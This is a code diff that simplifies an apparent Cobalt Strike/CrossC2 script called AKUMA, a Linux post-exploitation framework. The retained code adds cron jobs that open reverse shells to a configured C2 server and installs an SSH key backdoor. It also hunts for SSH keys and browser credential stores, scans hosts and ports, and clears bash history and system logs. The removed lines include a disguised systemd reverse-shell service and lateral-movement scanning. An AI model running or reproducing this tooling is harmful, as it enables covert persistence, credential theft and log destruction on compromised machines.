@@ -1,16 +1,12 @@
-# AKUMA's Linux Post-Exploitation Framework
-# Comprehensive Linux post-exploitation toolkit for CrossC2
+# AKUMA's Linux Post-Exploitation Framework - SIMPLE VERSION
 
-# ========== CONFIGURATION ==========
 %postex_config = %(
     c2_server => "192.168.1.100",
     callback_port => 4444,
     backup_ports => @(5555, 6666, 7777),
-    working_dir => "/tmp/.akuma",
-    max_scan_range => 254
+    working_dir => "/tmp/.akuma"
 );
 
-# ========== MAIN MENU ==========
 popup beacon_bottom {
     menu "&AKUMA Linux PostEx" {
         menu "&Reconnaissance" {
@@ -28,58 +24,39 @@ popup beacon_bottom {
             item "&Enum for PrivEsc" {
                 akuma_privesc_enum($1);
             }
-            item "&Kernel Exploits Check" {
+            item "&Kernel Check" {
                 akuma_kernel_check($1);
             }
-            item "&SUID/SGID Hunt" {
+            item "&SUID Hunt" {
                 akuma_suid_hunt($1);
             }
         }
         menu "&Persistence" {
-            item "&Install Cron Backdoors" {
+            item "&Install Cron" {
                 akuma_cron_persistence($1);
             }
             item "&SSH Key Backdoor" {
                 akuma_ssh_persistence($1);
             }
-            item "&Service Persistence" {
-                akuma_service_persistence($1);
-            }
-        }
-        menu "&Lateral Movement" {
-            item "&Trust Relationship Enum" {
-                akuma_trust_enum($1);
-            }
-            item "&Internal Network Scan" {
-                akuma_internal_scan($1);
-            }
-            item "&Share Discovery" {
-                akuma_share_discovery($1);
-            }
         }
         menu "&Data Collection" {
-            item "&Sensitive File Hunt" {
+            item "&File Hunt" {
                 akuma_file_hunt($1);
             }
-            item "&Browser Data Extract" {
+            item "&Browser Data" {
                 akuma_browser_extract($1);
-            }
-            item "&Database Discovery" {
-                akuma_database_discovery($1);
             }
         }
         menu "&Cleanup" {
             item "&Clear Logs" {
                 akuma_cleanup_logs($1);
             }
-            item "&Enable Stealth Mode" {
+            item "&Stealth Mode" {
                 akuma_stealth_mode($1);
             }
         }
     }
 }
-
-# ========== RECONNAISSANCE FUNCTIONS ==========
 
 sub akuma_quick_enum {
     local('$bid');
@@ -98,7 +75,7 @@ sub akuma_quick_enum {
     bshell($bid, "sudo -l 2>/dev/null");
     
     bshell($bid, "echo '=== RUNNING PROCESSES ==='");
-    bshell($bid, "ps aux --sort=-%cpu | head -10");
+    bshell($bid, "ps aux | head -10");
     bshell($bid, "echo '=== NETWORK ==='");
     bshell($bid, "ip addr show 2>/dev/null || ifconfig");
     bshell($bid, "ss -tlnp 2>/dev/null || netstat -tlnp");
@@ -115,7 +92,7 @@ sub akuma_deep_scan {
     bshell($bid, "echo '=== AKUMA DEEP SYSTEM ANALYSIS ==='");
     bshell($bid, "echo '=== SYSTEM INFO ==='");
     bshell($bid, "uname -a");
-    bshell($bid, "hostnamectl 2>/dev/null || hostname -f");
+    bshell($bid, "hostname -f 2>/dev/null || hostname");
     bshell($bid, "cat /proc/version");
     bshell($bid, "lsb_release -a 2>/dev/null");
     
@@ -126,27 +103,19 @@ sub akuma_deep_scan {
     bshell($bid, "lsblk 2>/dev/null");
     
     bshell($bid, "echo '=== USERS & GROUPS ==='");
-    bshell($bid, "cat /etc/passwd | grep -E '/bin/(bash|zsh|sh)$'");
-    bshell($bid, "cat /etc/group | grep -E '(sudo|wheel|admin)'");
+    bshell($bid, "cat /etc/passwd | grep bash");
+    bshell($bid, "cat /etc/group | grep sudo");
     bshell($bid, "lastlog 2>/dev/null | head -10");
     bshell($bid, "w 2>/dev/null");
     
     bshell($bid, "echo '=== SERVICES ==='");
     bshell($bid, "systemctl list-units --type=service --state=running 2>/dev/null | head -20");
-    bshell($bid, "ps aux --sort=-%mem | head -15");
+    bshell($bid, "ps aux | head -15");
     
     bshell($bid, "echo '=== NETWORK DETAILED ==='");
     bshell($bid, "ip route 2>/dev/null || route -n");
     bshell($bid, "cat /etc/resolv.conf");
     bshell($bid, "arp -a 2>/dev/null | head -20");
-    bshell($bid, "ss -anp 2>/dev/null | grep ESTABLISHED | head -15");
-    
-    bshell($bid, "echo '=== INSTALLED SOFTWARE ==='");
-    bshell($bid, "dpkg -l 2>/dev/null | grep -E '(apache|nginx|mysql|postgres|docker)' || rpm -qa 2>/dev/null | grep -E '(apache|nginx|mysql|postgres|docker)'");
-    
-    bshell($bid, "echo '=== MOUNTS & STORAGE ==='");
-    bshell($bid, "mount | grep -v 'tmpfs\\|proc\\|sys'");
-    bshell($bid, "cat /etc/fstab | grep -v '^#'");
     
     blog($bid, "AKUMA Deep Scan Complete!");
 }
@@ -158,20 +127,22 @@ sub akuma_network_discovery {
     blog($bid, "AKUMA Network Discovery Starting...");
     
     bshell($bid, "echo '=== NETWORK DISCOVERY ==='");
-    bshell($bid, "ip route | grep -E '^[0-9]' | awk '{print $1}' | grep '/'");
+    bshell($bid, "ip route | grep -v default | head -5");
     bshell($bid, "arp -a 2>/dev/null | head -20");
     
     bshell($bid, "echo '=== PING SWEEP ==='");
-    bshell($bid, "for i in {1..20}; do ping -c 1 -W 1 192.168.1.$i >/dev/null 2>&1 && echo \"192.168.1.$i alive\" &; done; wait");
-    bshell($bid, "for i in {1..20}; do ping -c 1 -W 1 10.0.0.$i >/dev/null 2>&1 && echo \"10.0.0.$i alive\" &; done; wait");
+    bshell($bid, "ping -c 1 192.168.1.1 >/dev/null 2>&1 && echo '192.168.1.1 alive'");
+    bshell($bid, "ping -c 1 192.168.1.10 >/dev/null 2>&1 && echo '192.168.1.10 alive'");
+    bshell($bid, "ping -c 1 10.0.0.1 >/dev/null 2>&1 && echo '10.0.0.1 alive'");
+    bshell($bid, "ping -c 1 10.0.0.10 >/dev/null 2>&1 && echo '10.0.0.10 alive'");
     
     bshell($bid, "echo '=== PORT SCAN LOCALHOST ==='");
-    bshell($bid, "for port in 21 22 23 25 53 80 135 139 443 445 993 995 1433 3389 5432 8080; do timeout 1 bash -c \"</dev/tcp/localhost/$port\" 2>/dev/null && echo \"Port $port open\"; done");
+    bshell($bid, "timeout 1 bash -c 'cat < /dev/null > /dev/tcp/localhost/22' 2>/dev/null && echo 'Port 22 open'");
+    bshell($bid, "timeout 1 bash -c 'cat < /dev/null > /dev/tcp/localhost/80' 2>/dev/null && echo 'Port 80 open'");
+    bshell($bid, "timeout 1 bash -c 'cat < /dev/null > /dev/tcp/localhost/443' 2>/dev/null && echo 'Port 443 open'");
     
     blog($bid, "AKUMA Network Discovery Complete!");
 }
-
-# ========== PRIVILEGE ESCALATION FUNCTIONS ==========
 
 sub akuma_privesc_enum {
     local('$bid');
@@ -188,7 +159,7 @@ sub akuma_privesc_enum {
     bshell($bid, "find / -perm -4000 -type f 2>/dev/null | head -20");
     bshell($bid, "find / -perm -2000 -type f 2>/dev/null | head -20");
     
-    bshell($bid, "echo '=== WORLD WRITABLE DIRECTORIES ==='");
+    bshell($bid, "echo '=== WRITABLE DIRECTORIES ==='");
     bshell($bid, "find / -writable -type d 2>/dev/null | grep -v proc | head -20");
     
     bshell($bid, "echo '=== CRON JOBS ==='");
@@ -206,15 +177,15 @@ sub akuma_kernel_check {
     local('$bid');
     $bid = $1;
     
-    blog($bid, "AKUMA Kernel Exploits Check Starting...");
+    blog($bid, "AKUMA Kernel Check Starting...");
     
     bshell($bid, "echo '=== KERNEL EXPLOIT CHECK ==='");
     bshell($bid, "uname -a");
     bshell($bid, "cat /proc/version");
     bshell($bid, "lsb_release -a 2>/dev/null");
     
-    bshell($bid, "echo '=== CHECKING FOR KNOWN VULNERABILITIES ==='");
-    bshell($bid, "uname -r | grep -E '(3\\.13|4\\.4|4\\.8|4\\.10)' && echo 'Potentially vulnerable kernel version!'");
+    bshell($bid, "echo '=== CHECKING VULNERABILITIES ==='");
+    bshell($bid, "uname -r");
     
     blog($bid, "AKUMA Kernel Check Complete!");
 }
@@ -223,19 +194,20 @@ sub akuma_suid_hunt {
     local('$bid');
     $bid = $1;
     
-    blog($bid, "AKUMA SUID/SGID Hunt Starting...");
+    blog($bid, "AKUMA SUID Hunt Starting...");
     
     bshell($bid, "echo '=== SUID/SGID HUNT ==='");
-    bshell($bid, "find / -perm -4000 -type f 2>/dev/null | xargs ls -la 2>/dev/null");
-    bshell($bid, "find / -perm -2000 -type f 2>/dev/null | xargs ls -la 2>/dev/null");
+    bshell($bid, "find / -perm -4000 -type f 2>/dev/null | head -30");
+    bshell($bid, "find / -perm -2000 -type f 2>/dev/null | head -30");
     
-    bshell($bid, "echo '=== POTENTIAL GTFOBINS CANDIDATES ==='");
-    bshell($bid, "find / -perm -4000 -name 'vim*' -o -name 'nano*' -o -name 'less*' -o -name 'more*' -o -name 'nmap*' -o -name 'awk*' -o -name 'python*' -o -name 'perl*' 2>/dev/null");
+    bshell($bid, "echo '=== POTENTIAL GTFOBINS ==='");
+    bshell($bid, "find / -perm -4000 -name 'vim*' 2>/dev/null");
+    bshell($bid, "find / -perm -4000 -name 'nano*' 2>/dev/null");
+    bshell($bid, "find / -perm -4000 -name 'less*' 2>/dev/null");
+    bshell($bid, "find / -perm -4000 -name 'python*' 2>/dev/null");
     
     blog($bid, "AKUMA SUID Hunt Complete!");
 }
-
-# ========== PERSISTENCE FUNCTIONS ==========
 
 sub akuma_cron_persistence {
     local('$bid $server $port');
@@ -245,10 +217,9 @@ sub akuma_cron_persistence {
     
     blog($bid, "AKUMA Cron Persistence Starting...");
     
+    bshell($bid, "echo 'Installing cron persistence...'");
     bshell($bid, "(crontab -l 2>/dev/null; echo '*/15 * * * * /bin/bash -c \"bash -i >& /dev/tcp/" . $server . "/" . $port . " 0>&1\"') | crontab -");
     bshell($bid, "(crontab -l 2>/dev/null; echo '@reboot sleep 60 && /bin/bash -c \"bash -i >& /dev/tcp/" . $server . "/" . $port . " 0>&1\"') | crontab -");
-    
-    bshell($bid, "if [ \"$EUID\" -eq 0 ]; then echo '*/10 * * * * root /bin/bash -c \"bash -i >& /dev/tcp/" . $server . "/" . $port . " 0>&1\"' >> /etc/crontab; fi");
     
     blog($bid, "AKUMA Cron Persistence Complete!");
 }
@@ -267,124 +238,26 @@ sub akuma_ssh_persistence {
     blog($bid, "AKUMA SSH Persistence Complete! Private key printed above.");
 }
 
-sub akuma_service_persistence {
-    local('$bid $server $port');
-    $bid = $1;
-    $server = %postex_config["c2_server"];
-    $port = %postex_config["callback_port"];
-    
-    blog($bid, "AKUMA Service Persistence Starting...");
-    
-    bshell($bid, "if [ \"$EUID\" -eq 0 ]; then");
-    bshell($bid, "cat > /etc/systemd/system/akuma-service.service << 'EOF'");
-    bshell($bid, "[Unit]");
-    bshell($bid, "Description=System Monitor Service");
-    bshell($bid, "After=network.target");
-    bshell($bid, "");
-    bshell($bid, "[Service]");
-    bshell($bid, "Type=simple");
-    bshell($bid, "ExecStart=/bin/bash -c 'while true; do sleep 300; /bin/bash -c \"bash -i >& /dev/tcp/" . $server . "/" . $port . " 0>&1\" 2>/dev/null; done'");
-    bshell($bid, "Restart=always");
-    bshell($bid, "User=nobody");
-    bshell($bid, "");
-    bshell($bid, "[Install]");
-    bshell($bid, "WantedBy=multi-user.target");
-    bshell($bid, "EOF");
-    bshell($bid, "systemctl enable akuma-service.service 2>/dev/null; systemctl start akuma-service.service 2>/dev/null; fi");
-    
-    blog($bid, "AKUMA Service Persistence Complete!");
-}
-
-# ========== LATERAL MOVEMENT FUNCTIONS ==========
-
-sub akuma_trust_enum {
-    local('$bid');
-    $bid = $1;
-    
-    blog($bid, "AKUMA Trust Relationship Enumeration Starting...");
-    
-    bshell($bid, "echo '=== TRUST RELATIONSHIP ANALYSIS ==='");
-    bshell($bid, "echo '=== SSH CONNECTIONS ==='");
-    bshell($bid, "ss -anp 2>/dev/null | grep :22 | grep ESTABLISHED");
-    bshell($bid, "netstat -anp 2>/dev/null | grep :22 | grep ESTABLISHED");
-    
-    bshell($bid, "echo '=== KNOWN HOSTS ==='");
-    bshell($bid, "cat ~/.ssh/known_hosts 2>/dev/null | awk '{print $1}' | sort -u");
-    bshell($bid, "find /home -name 'known_hosts' 2>/dev/null | xargs cat 2>/dev/null | awk '{print $1}' | sort -u");
-    
-    bshell($bid, "echo '=== RECENT CONNECTIONS ==='");
-    bshell($bid, "last -i | head -20");
-    bshell($bid, "lastlog 2>/dev/null | head -10");
-    
-    bshell($bid, "echo '=== SSH CONFIG ==='");
-    bshell($bid, "cat ~/.ssh/config 2>/dev/null");
-    bshell($bid, "find /home -name 'config' -path '*/.ssh/*' 2>/dev/null | xargs cat 2>/dev/null");
-    
-    blog($bid, "AKUMA Trust Enumeration Complete!");
-}
-
-sub akuma_internal_scan {
-    local('$bid');
-    $bid = $1;
-    
-    blog($bid, "AKUMA Internal Network Scan Starting...");
-    
-    bshell($bid, "echo '=== INTERNAL NETWORK SCAN ==='");
-    bshell($bid, "ip route | grep -E '^[0-9]' | awk '{print $1}' | grep '/'");
-    
-    bshell($bid, "echo '=== PORT SCANNING COMMON HOSTS ==='");
-    bshell($bid, "for host in 192.168.1.1 192.168.1.10 192.168.1.100 10.0.0.1 10.0.0.10; do echo \"Scanning $host:\"; for port in 22 80 135 139 443 445 3389; do timeout 1 bash -c \"</dev/tcp/$host/$port\" 2>/dev/null && echo \"  $port/tcp open\"; done; done");
-    
-    blog($bid, "AKUMA Internal Scan Complete!");
-}
-
-sub akuma_share_discovery {
-    local('$bid');
-    $bid = $1;
-    
-    blog($bid, "AKUMA Share Discovery Starting...");
-    
-    bshell($bid, "echo '=== NETWORK SHARES DISCOVERY ==='");
-    bshell($bid, "echo '=== NFS SHARES ==='");
-    bshell($bid, "showmount -e 2>/dev/null");
-    bshell($bid, "showmount -e localhost 2>/dev/null");
-    bshell($bid, "cat /etc/exports 2>/dev/null");
-    bshell($bid, "mount | grep nfs");
-    
-    bshell($bid, "echo '=== SMB/CIFS SHARES ==='");
-    bshell($bid, "smbclient -L //localhost -N 2>/dev/null");
-    bshell($bid, "mount | grep cifs");
-    bshell($bid, "cat /etc/samba/smb.conf 2>/dev/null | grep -v '^#' | grep -v '^$'");
-    
-    bshell($bid, "echo '=== CURRENT MOUNTS ==='");
-    bshell($bid, "mount | grep -E 'nfs|cifs|sshfs|ftp'");
-    bshell($bid, "cat /etc/fstab | grep -E 'nfs|cifs|sshfs|ftp'");
-    
-    blog($bid, "AKUMA Share Discovery Complete!");
-}
-
-# ========== DATA COLLECTION FUNCTIONS ==========
-
 sub akuma_file_hunt {
     local('$bid');
     $bid = $1;
     
-    blog($bid, "AKUMA Sensitive File Hunt Starting...");
+    blog($bid, "AKUMA File Hunt Starting...");
     
     bshell($bid, "echo '=== SENSITIVE FILE HUNT ==='");
     bshell($bid, "echo '=== DOCUMENTS ==='");
-    bshell($bid, "find /home -type f -name '*.pdf' -o -name '*.doc' -o -name '*.docx' -o -name '*.xls' -o -name '*.xlsx' 2>/dev/null | head -20");
-    
-    bshell($bid, "echo '=== PASSWORD FILES ==='");
-    bshell($bid, "find /home -type f -name '*.txt' 2>/dev/null | xargs grep -l -i 'password' 2>/dev/null | head -10");
-    bshell($bid, "find /home -type f -name '*.conf' 2>/dev/null | xargs grep -l -i 'password' 2>/dev/null | head -10");
+    bshell($bid, "find /home -name '*.pdf' 2>/dev/null | head -20");
+    bshell($bid, "find /home -name '*.doc*' 2>/dev/null | head -20");
+    bshell($bid, "find /home -name '*.xls*' 2>/dev/null | head -20");
     
     bshell($bid, "echo '=== SSH KEYS ==='");
-    bshell($bid, "find /home -type f -name 'id_*' 2>/dev/null | head -10");
-    bshell($bid, "find /home -type f -name '*.pem' 2>/dev/null | head -10");
+    bshell($bid, "find /home -name 'id_*' 2>/dev/null | head -10");
+    bshell($bid, "find /home -name '*.pem' 2>/dev/null | head -10");
     
     bshell($bid, "echo '=== ARCHIVES ==='");
-    bshell($bid, "find /home -type f -name '*.zip' -o -name '*.rar' -o -name '*.tar' -o -name '*.gz' 2>/dev/null | head -15");
+    bshell($bid, "find /home -name '*.zip' 2>/dev/null | head -15");
+    bshell($bid, "find /home -name '*.rar' 2>/dev/null | head -15");
+    bshell($bid, "find /home -name '*.tar*' 2>/dev/null | head -15");
     
     blog($bid, "AKUMA File Hunt Complete!");
 }
@@ -393,43 +266,21 @@ sub akuma_browser_extract {
     local('$bid');
     $bid = $1;
     
-    blog($bid, "AKUMA Browser Data Extract Starting...");
+    blog($bid, "AKUMA Browser Extract Starting...");
     
     bshell($bid, "echo '=== BROWSER DATA EXTRACTION ==='");
     bshell($bid, "echo '=== FIREFOX ==='");
-    bshell($bid, "find /home -path '*/.mozilla/firefox/*/places.sqlite' 2>/dev/null");
-    bshell($bid, "find /home -path '*/.mozilla/firefox/*/key4.db' 2>/dev/null");
-    bshell($bid, "find /home -path '*/.mozilla/firefox/*/logins.json' 2>/dev/null");
+    bshell($bid, "find /home -path '*/firefox/*/places.sqlite' 2>/dev/null");
+    bshell($bid, "find /home -path '*/firefox/*/key4.db' 2>/dev/null");
+    bshell($bid, "find /home -path '*/firefox/*/logins.json' 2>/dev/null");
     
-    bshell($bid, "echo '=== CHROME/CHROMIUM ==='");
-    bshell($bid, "find /home -path '*/.config/google-chrome/*/Login Data' 2>/dev/null");
-    bshell($bid, "find /home -path '*/.config/chromium/*/Login Data' 2>/dev/null");
-    bshell($bid, "find /home -path '*/.config/google-chrome/*/History' 2>/dev/null");
+    bshell($bid, "echo '=== CHROME ==='");
+    bshell($bid, "find /home -path '*chrome*/Login Data' 2>/dev/null");
+    bshell($bid, "find /home -path '*chrome*/History' 2>/dev/null");
+    bshell($bid, "find /home -path '*chromium*/Login Data' 2>/dev/null");
     
     blog($bid, "AKUMA Browser Extract Complete!");
 }
-
-sub akuma_database_discovery {
-    local('$bid');
-    $bid = $1;
-    
-    blog($bid, "AKUMA Database Discovery Starting...");
-    
-    bshell($bid, "echo '=== DATABASE DISCOVERY ==='");
-    bshell($bid, "echo '=== DATABASE FILES ==='");
-    bshell($bid, "find / -name '*.sql' -o -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null | head -20");
-    
-    bshell($bid, "echo '=== DATABASE SERVICES ==='");
-    bshell($bid, "ps aux | grep -E 'mysql|postgres|mongo|redis' | grep -v grep");
-    bshell($bid, "ss -tlnp | grep -E ':3306|:5432|:27017|:6379'");
-    
-    bshell($bid, "echo '=== DATABASE CONFIGS ==='");
-    bshell($bid, "find /etc -name '*mysql*' -o -name '*postgres*' 2>/dev/null | head -10");
-    
-    blog($bid, "AKUMA Database Discovery Complete!");
-}
-
-# ========== CLEANUP FUNCTIONS ==========
 
 sub akuma_cleanup_logs {
     local('$bid');
@@ -438,21 +289,15 @@ sub akuma_cleanup_logs {
     blog($bid, "AKUMA Log Cleanup Starting...");
     
     bshell($bid, "echo '=== LOG CLEANUP ==='");
-    bshell($bid, "if [ \"$EUID\" -eq 0 ]; then");
-    bshell($bid, "  > /var/log/auth.log");
-    bshell($bid, "  > /var/log/secure");
-    bshell($bid, "  > /var/log/messages");
-    bshell($bid, "  > /var/log/syslog");
-    bshell($bid, "  echo 'System logs cleared'");
-    bshell($bid, "else");
-    bshell($bid, "  echo 'Need root for system log cleanup'");
-    bshell($bid, "fi");
-    
+    bshell($bid, "echo 'Clearing user history...'");
     bshell($bid, "> ~/.bash_history");
     bshell($bid, "> ~/.zsh_history");
     bshell($bid, "history -c");
     bshell($bid, "export HISTFILE=/dev/null");
     bshell($bid, "unset HISTFILE");
+    
+    bshell($bid, "echo 'Attempting system log cleanup (requires root)...'");
+    bshell($bid, "if [ \"$EUID\" -eq 0 ]; then echo 'Root detected - clearing system logs'; > /var/log/auth.log; > /var/log/secure; > /var/log/messages; > /var/log/syslog; else echo 'Need root for system log cleanup'; fi");
     
     blog($bid, "AKUMA Log Cleanup Complete!");
 }
@@ -476,4 +321,4 @@ sub akuma_stealth_mode {
     blog($bid, "AKUMA Stealth Mode Enabled!");
 }
 
-blog("AKUMA Linux PostEx Framework Loaded! Right-click beacon for menu.");
+blog("AKUMA Linux PostEx Framework Loaded!");
